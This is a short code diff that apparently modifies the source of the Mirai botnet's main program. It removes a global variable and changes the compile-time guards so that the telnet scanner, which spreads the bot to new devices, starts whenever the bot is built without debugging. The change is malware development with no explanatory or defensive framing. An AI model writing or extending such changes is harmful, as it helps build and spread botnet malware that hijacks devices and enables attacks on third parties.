@@ -36,8 +36,6 @@ int fd_ctrl = -1, fd_serv = -1;
 BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
-ipv4_t LOCAL_ADDR;
-
 #ifdef DEBUG
 static void segv_handler(int sig, siginfo_t *si, void *unused)
 {
@@ -157,8 +155,8 @@ int main(int argc, char **args)
 
     attack_init();
     killer_init();
+#ifndef DEBUG
 #ifdef MIRAI_TELNET
-#ifdef INIT_SCANNER
     scanner_init();
 #endif
 #endif
